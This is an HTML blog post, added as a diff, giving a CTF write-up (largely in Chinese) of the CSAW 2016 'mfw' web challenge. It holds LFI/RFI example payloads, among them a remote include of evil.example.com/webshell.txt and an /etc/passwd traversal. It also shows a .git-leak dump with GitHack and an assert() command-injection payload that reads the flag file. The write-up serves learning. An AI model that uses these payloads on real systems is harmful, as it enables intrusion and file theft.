@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="Luc1fer">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="CSAW CTF 2016 mfw Writeup">
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="对未来的最大慷慨，就是把一切都献给现在。">
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="Luc1fer&#39;blog">
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article">
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary">
+    
+
+    <!-- Title -->
+    
+    <title>CSAW CTF 2016 mfw Writeup - Luc1fer&#39;blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories/">
+                    Categories
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2018/03/23/CSAW-CTF-2016-mfw-Writeup/">
+                CSAW CTF 2016 mfw Writeup
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2018-03-23</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/WP/">WP</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p>i cant input chinese,so,here is my poor english !</p>
+<a id="more"></a>
+<h1 id="CSAW-CTF-2016-mfw-Writeup"><a href="#CSAW-CTF-2016-mfw-Writeup" class="headerlink" title="CSAW CTF 2016 mfw Writeup"></a>CSAW CTF 2016 mfw Writeup</h1><h2 id="0x01-需要知道的"><a href="#0x01-需要知道的" class="headerlink" title="0x01 需要知道的"></a>0x01 需要知道的</h2><ol>
+<li>本地文件包含</li>
+<li>git源码泄露<h2 id="0x02-本地文件包含"><a href="#0x02-本地文件包含" class="headerlink" title="0x02 本地文件包含"></a>0x02 本地文件包含</h2>来自维基百科的解释：</li>
+</ol>
+<p>In PHP the main cause is due to the use of unvalidated user-input with a filesystem function that includes a file for execution.</p>
+<hr>
+<p>** most notable are the include and require statements.**</p>
+<hr>
+<p>Most of the vulnerabilities can be attributed to novice programmers not being familiar with all of the capabilities of the PHP programming language. The PHP language has a directive which, if enabled,</p>
+<hr>
+<p>** allows filesystem functions to use a URL to retrieve data from remote locations**.[1]</p>
+<hr>
+<p> The directive is allow_url_fopen in PHP versions &lt;= 4.3.4 and allow_url_include since PHP 5.2.0. In PHP 5.x this directive is disabled by default, in prior versions it was enabled by default.[2] To exploit the vulnerability an attacker will alter a variable that is passed to one of these functions to cause it to include malicious code from a remote resource.</p>
+<hr>
+<p>** To mitigate this vulnerability all user input needs to be validated before being used.**</p>
+<p>大体意思就是说使用了 include 和 require 的代码可能会因为代码的质量不好，没有对传入的变量进行检测，导致允许远程主机使用URL里的恶意代码从文件系统里获取到敏感文件信息。</p>
+<p>Example：</p>
+<pre><code>&lt;?php
+   if ( isset( $_GET[&apos;language&apos;] ) ) {
+  include( $_GET[&apos;language&apos;] . &apos;.php&apos; );
+   }
+?&gt;
+&lt;form method=&quot;get&quot;&gt;
+   &lt;select name=&quot;language&quot;&gt;
+      &lt;option value=&quot;english&quot;&gt;English&lt;/option&gt;
+      &lt;option value=&quot;french&quot;&gt;French&lt;/option&gt;
+      ...
+   &lt;/select&gt;
+   &lt;input type=&quot;submit&quot;&gt;
+&lt;/form&gt;</code></pre><p>以下是payload:</p>
+<pre><code>/vulnerable.php?language=http://evil.example.com/webshell.txt? - injects a remotely hosted file containing a malicious code (remote file include)
+/vulnerable.php?language=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)
+/vulnerable.php?language=C:\\notes.txt%00 - example using NULL meta character to remove the .php suffix, allowing access to files other than .php. This use of null byte injection was patched in PHP 5.3, and can no longer be used for LFI/RFI attacks.[5]
+/vulnerable.php?language=../../../../../etc/passwd%00 - allows an attacker to read the contents of the /etc/passwd file on a Unix system through a directory traversal attack.</code></pre><h2 id="0x03-git源码泄露"><a href="#0x03-git源码泄露" class="headerlink" title="0x03 git源码泄露"></a>0x03 git源码泄露</h2><p>使用git在初始化代码库的时候，会在当前目录下产生一个.git的隐藏目录，用来记录代码的变更等。同时使用这个文件可以恢复各个版本的代码，所以如果.git文件可以访问，就可能泄露了源代码。</p>
+<h2 id="0x04-题目"><a href="#0x04-题目" class="headerlink" title="0x04 题目"></a>0x04 题目</h2><p><img src="https://i.imgur.com/1cGM2Pl.png" alt></p>
+<p>查看源码，发现可能的漏洞</p>
+<p><img src="https://i.imgur.com/Qutnt0L.png" alt></p>
+<p>于是我们尝试用文件包含来获取密码信息</p>
+<pre><code>http://111.198.29.45:31930/?page=../../../../../etc/passwd</code></pre><p>发现被过滤了。flag页面可能作为隐藏变量了。</p>
+<p>看到about页面说使用了git</p>
+<p><img src="https://i.imgur.com/qHNE2ot.png" alt></p>
+<p>想到.git源码泄露，访问.git文件，发现可以访问</p>
+<p><img src="https://i.imgur.com/V87suOa.png" alt></p>
+<p>我们使用 工具GitHack将网站源码clone下来。</p>
+<blockquote>
+<p><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
+</blockquote>
+<p>GitHack的工作原理是</p>
+<blockquote>
+<p>GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，重建还原工程源代码。<br>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL注射等web安全漏洞。</p>
+</blockquote>
+<p>使用命令：</p>
+<pre><code>&gt;python2 GitHack.py http://111.198.29.45:31930/.git/</code></pre><p>在flag.php文件中只有：</p>
+<pre><code>&lt;?php
+// TODO
+// $FLAG = &apos;&apos;;
+?&gt;</code></pre><p>没什么帮助，去index.php里查看：</p>
+<pre><code>&lt;?php
+
+if (isset($_GET[&apos;page&apos;])) {
+$page = $_GET[&apos;page&apos;];
+} else {
+    $page = &quot;home&quot;;
+}
+
+$file = &quot;templates/&quot; . $page . &quot;.php&quot;;
+
+// I heard &apos;..&apos; is dangerous!
+assert(&quot;strpos(&apos;$file&apos;, &apos;..&apos;) === false&quot;) or die(&quot;Detected hacking attempt!&quot;);
+
+// TODO: Make this look nice
+assert(&quot;file_exists(&apos;$file&apos;)&quot;) or die(&quot;That file doesn&apos;t exist!&quot;);
+
+?&gt;</code></pre><p>这里需要注意的是出现的这几个函数</p>
+<p>strops:<br>返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE.</p>
+<p>assert:*<em>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>*</em></p>
+<p>又看到代码对输入的page变量没有检测，这就是说我们有机会对其改造，使其执行系统命令。<br>下面是大神的payload:</p>
+<pre><code>flag&apos;,&apos;..&apos;)+or+system(&apos;cat+templates/flag.php&apos;);//</code></pre><p>注意到assert语句里的strops是单引号，我们就将其闭合，并执行系统命令获取flag.php文件内容，同时将后面的die语句注释掉。</p>
+<p>大神就是大神！</p>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/WP/">#WP</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/31/JavaScript原型污染/">JavaScript Prototype 污染攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/30/SSTI/">SSTI-服务器端模板注入</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/22/HostSplit/">HostSplit-Exploitable</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/08/19/Black-magic/">black_magic</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
+        
+        <li>
+            <a class="footer-post" href="/categories/比赛回顾/">比赛回顾</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/docker/">docker</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/wp/">wp</a>
+        </li>
+        
+        <li>
+            <a class="footer-post" href="/categories/渗透测试/">渗透测试</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/BrainLyh">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:brainsemail@163.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
